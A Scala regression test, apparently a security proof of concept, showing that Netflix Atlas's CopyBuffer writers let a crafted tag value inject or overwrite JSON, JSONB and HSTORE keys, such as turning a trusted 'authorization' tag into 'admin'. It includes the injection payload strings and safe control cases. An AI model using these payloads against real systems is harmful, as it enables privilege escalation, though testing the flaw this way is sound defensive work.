/*
 * Local-only regression test for Netflix/atlas commit
 * be85494f3f4b910f91890b69bf47f0ee25662829.
 *
 * The test uses the real Atlas CopyBuffer implementations and the same
 * io.zonky.test EmbeddedPostgres fixture used by atlas-postgres tests.
 */
package com.netflix.atlas.postgres

import com.netflix.atlas.core.util.SortedTagMap
import io.zonky.test.db.postgres.embedded.EmbeddedPostgres
import munit.FunSuite
import org.postgresql.copy.CopyManager
import org.postgresql.core.BaseConnection

import java.nio.charset.StandardCharsets
import java.nio.file.Files
import java.nio.file.Paths
import java.sql.Connection
import java.sql.DriverManager
import java.sql.ResultSet
import scala.util.Using

class CopyBufferSecurityRegressionSuite extends FunSuite {

  private case class Probe(
    authorization: String,
    zz: String,
    injected: String,
    keyCount: Int,
    stored: String
  )

  private var postgres: EmbeddedPostgres = _
  private var connection: Connection = _
  private var copyManager: CopyManager = _

  override def beforeAll(): Unit = {
    postgres = EmbeddedPostgres
      .builder()
      .setCleanDataDirectory(true)
      .setPort(54321)
      .start()

    Class.forName("org.postgresql.Driver")
    connection = DriverManager.getConnection(
      "jdbc:postgresql://localhost:54321/postgres",
      "postgres",
      "postgres"
    )
    copyManager = connection.asInstanceOf[BaseConnection].getCopyAPI
  }

  override def afterAll(): Unit = {
    if (connection != null) connection.close()
    if (postgres != null) postgres.close()
  }

  private def execute(sql: String): Unit = {
    Using.resource(connection.createStatement())(_.executeUpdate(sql))
  }

  private def field(rs: ResultSet, i: Int): String = {
    Option(rs.getString(i)).getOrElse("<null>")
  }

  private def jsonbProbe(table: String): Probe = {
    Using.resource(connection.createStatement()) { stmt =>
      Using.resource(
        stmt.executeQuery(
          s"""select
             |  coalesce(value ->> 'authorization', '<null>'),
             |  coalesce(value ->> 'zz', '<null>'),
             |  coalesce(value ->> 'injected', '<null>'),
             |  (select count(*) from jsonb_each(value)),
             |  value::text
             |from $table""".stripMargin
        )
      ) { rs =>
        assert(rs.next())
        val p = Probe(field(rs, 1), field(rs, 2), field(rs, 3), rs.getInt(4), field(rs, 5))
        assert(!rs.next())
        p
      }
    }
  }

  private def jsonProbe(table: String): Probe = {
    Using.resource(connection.createStatement()) { stmt =>
      Using.resource(
        stmt.executeQuery(
          s"""select
             |  coalesce(value ->> 'authorization', '<null>'),
             |  coalesce(value ->> 'zz', '<null>'),
             |  coalesce(value ->> 'injected', '<null>'),
             |  (select count(*) from json_each(value)),
             |  value::text
             |from $table""".stripMargin
        )
      ) { rs =>
        assert(rs.next())
        val p = Probe(field(rs, 1), field(rs, 2), field(rs, 3), rs.getInt(4), field(rs, 5))
        assert(!rs.next())
        p
      }
    }
  }

  private def hstoreProbe(table: String): Probe = {
    Using.resource(connection.createStatement()) { stmt =>
      Using.resource(
        stmt.executeQuery(
          s"""select
             |  coalesce(value -> 'authorization', '<null>'),
             |  coalesce(value -> 'zz', '<null>'),
             |  coalesce(value -> 'injected', '<null>'),
             |  cardinality(akeys(value)),
             |  value::text
             |from $table""".stripMargin
        )
      ) { rs =>
        assert(rs.next())
        val p = Probe(field(rs, 1), field(rs, 2), field(rs, 3), rs.getInt(4), field(rs, 5))
        assert(!rs.next())
        p
      }
    }
  }

  private def jsonQuote(s: String): String = {
    val b = new java.lang.StringBuilder(s.length + 16)
    b.append('"')
    var i = 0
    while (i < s.length) {
      s.charAt(i) match {
        case '"'  => b.append("\\\"")
        case '\\' => b.append("\\\\")
        case '\b' => b.append("\\b")
        case '\f' => b.append("\\f")
        case '\n' => b.append("\\n")
        case '\r' => b.append("\\r")
        case '\t' => b.append("\\t")
        case c if c < ' ' => b.append(f"\\u${c.toInt}%04x")
        case c             => b.append(c)
      }
      i += 1
    }
    b.append('"').toString
  }

  private def probeJson(p: Probe): String = {
    s"""{
       |      "authorization": ${jsonQuote(p.authorization)},
       |      "zz": ${jsonQuote(p.zz)},
       |      "injected": ${jsonQuote(p.injected)},
       |      "key_count": ${p.keyCount},
       |      "stored": ${jsonQuote(p.stored)}
       |    }""".stripMargin
  }

  test("attacker-controlled tag value cannot become sibling structured tags") {
    execute("create extension if not exists hstore")
    execute(
      """drop table if exists
        |  atlas_text_json,
        |  atlas_text_jsonb,
        |  atlas_text_hstore,
        |  atlas_binary_json,
        |  atlas_binary_jsonb,
        |  atlas_binary_hstore_control,
        |  atlas_jdbc_jsonb_control""".stripMargin
    )
    execute("create table atlas_text_json(value json)")
    execute("create table atlas_text_jsonb(value jsonb)")
    execute("create table atlas_text_hstore(value hstore)")
    execute("create table atlas_binary_json(value json)")
    execute("create table atlas_binary_jsonb(value jsonb)")
    execute("create table atlas_binary_hstore_control(value hstore)")
    execute("create table atlas_jdbc_jsonb_control(value jsonb)")

    // The attacker controls only the value associated with `zz`.
    // `authorization=user` is a separate typed/trusted tag.
    val jsonPayload = "attacker\",\"authorization\":\"admin"
    val jsonTags = SortedTagMap(
      "authorization" -> "user",
      "zz"            -> jsonPayload
    )

    val hstorePayload = "attacker\",\"injected\"=>\"admin"
    val hstoreTags = SortedTagMap(
      "authorization" -> "user",
      "zz"            -> hstorePayload
    )

    val textJson = new TextCopyBuffer(8192)
    assert(textJson.putTagsJson(jsonTags).nextRow())
    val textJsonWire = textJson.toString
    textJson.copyIn(copyManager, "atlas_text_json")

    val textJsonb = new TextCopyBuffer(8192)
    assert(textJsonb.putTagsJsonb(jsonTags).nextRow())
    val textJsonbWire = textJsonb.toString
    textJsonb.copyIn(copyManager, "atlas_text_jsonb")

    val textHstore = new TextCopyBuffer(8192)
    assert(textHstore.putTagsHstore(hstoreTags).nextRow())
    val textHstoreWire = textHstore.toString
    textHstore.copyIn(copyManager, "atlas_text_hstore")

    val binaryJson = new BinaryCopyBuffer(8192, 1)
    assert(binaryJson.putTagsJson(jsonTags).nextRow())
    val binaryJsonWire = binaryJson.toString
    binaryJson.copyIn(copyManager, "atlas_binary_json")

    val binaryJsonb = new BinaryCopyBuffer(8192, 1)
    assert(binaryJsonb.putTagsJsonb(jsonTags).nextRow())
    val binaryJsonbWire = binaryJsonb.toString
    binaryJsonb.copyIn(copyManager, "atlas_binary_jsonb")

    // Negative control using Atlas's length-delimited binary HSTORE writer.
    val binaryHstore = new BinaryCopyBuffer(8192, 1)
    assert(binaryHstore.putTagsHstore(hstoreTags).nextRow())
    binaryHstore.copyIn(copyManager, "atlas_binary_hstore_control")

    // Independent expected-behavior control: correctly JSON-encode the typed map
    // and bind the resulting value instead of concatenating grammar fragments.
    val correctJson =
      s"""{"authorization":"user","zz":${jsonQuote(jsonPayload)}}"""
    Using.resource(
      connection.prepareStatement("insert into atlas_jdbc_jsonb_control(value) values (?::jsonb)")
    ) { ps =>
      ps.setString(1, correctJson)
      assertEquals(ps.executeUpdate(), 1)
    }

    val textJsonResult = jsonProbe("atlas_text_json")
    val textJsonbResult = jsonbProbe("atlas_text_jsonb")
    val textHstoreResult = hstoreProbe("atlas_text_hstore")
    val binaryJsonResult = jsonProbe("atlas_binary_json")
    val binaryJsonbResult = jsonbProbe("atlas_binary_jsonb")
    val binaryHstoreControl = hstoreProbe("atlas_binary_hstore_control")
    val jdbcJsonbControl = jsonbProbe("atlas_jdbc_jsonb_control")

    // Current vulnerable behavior: a value controlled through `zz` changes
    // the parsed object and overwrites the separate authorization tag.
    List(textJsonResult, textJsonbResult, binaryJsonResult, binaryJsonbResult).foreach { p =>
      assertEquals(p.authorization, "admin")
      assertEquals(p.zz, "attacker")
      assertEquals(p.injected, "<null>")
    }
    assertEquals(textJsonbResult.keyCount, 2)
    assertEquals(binaryJsonbResult.keyCount, 2)

    // Text HSTORE has the same nested-grammar flaw and creates another key.
    assertEquals(textHstoreResult.authorization, "user")
    assertEquals(textHstoreResult.zz, "attacker")
    assertEquals(textHstoreResult.injected, "admin")
    assertEquals(textHstoreResult.keyCount, 3)

    // Both controls preserve the original typed boundaries.
    assertEquals(binaryHstoreControl.authorization, "user")
    assertEquals(binaryHstoreControl.zz, hstorePayload)
    assertEquals(binaryHstoreControl.injected, "<null>")
    assertEquals(binaryHstoreControl.keyCount, 2)

    assertEquals(jdbcJsonbControl.authorization, "user")
    assertEquals(jdbcJsonbControl.zz, jsonPayload)
    assertEquals(jdbcJsonbControl.injected, "<null>")
    assertEquals(jdbcJsonbControl.keyCount, 2)

    val output = sys.env.getOrElse("ATLAS_COPY_RESULT", "atlas-copybuffer-result.json")
    val atlasCommit = sys.env.getOrElse("ATLAS_COMMIT", "unknown")
    val serverVersion = Using.resource(connection.createStatement()) { stmt =>
      Using.resource(stmt.executeQuery("show server_version")) { rs =>
        assert(rs.next())
        rs.getString(1)
      }
    }

    val result =
      s"""{
         |  "verdict": "PASS",
         |  "atlas_commit": ${jsonQuote(atlasCommit)},
         |  "postgresql_version": ${jsonQuote(serverVersion)},
         |  "attacker_controls_only": {
         |    "tag_key": "zz",
         |    "json_tag_value": ${jsonQuote(jsonPayload)},
         |    "hstore_tag_value": ${jsonQuote(hstorePayload)}
         |  },
         |  "separate_trusted_tag": {"authorization": "user"},
         |  "actual_text_json": ${probeJson(textJsonResult)},
         |  "actual_text_jsonb": ${probeJson(textJsonbResult)},
         |  "actual_text_hstore": ${probeJson(textHstoreResult)},
         |  "actual_binary_json": ${probeJson(binaryJsonResult)},
         |  "actual_binary_jsonb": ${probeJson(binaryJsonbResult)},
         |  "negative_binary_hstore": ${probeJson(binaryHstoreControl)},
         |  "negative_bound_jsonb": ${probeJson(jdbcJsonbControl)},
         |  "wire": {
         |    "text_json": ${jsonQuote(textJsonWire)},
         |    "text_jsonb": ${jsonQuote(textJsonbWire)},
         |    "text_hstore": ${jsonQuote(textHstoreWire)},
         |    "binary_json_printable": ${jsonQuote(binaryJsonWire)},
         |    "binary_jsonb_printable": ${jsonQuote(binaryJsonbWire)}
         |  }
         |}
         |""".stripMargin

    Files.writeString(Paths.get(output), result, StandardCharsets.UTF_8)
    println("ATLAS_COPYBUFFER_SECURITY_POC=PASS")
    println(result)
  }
}
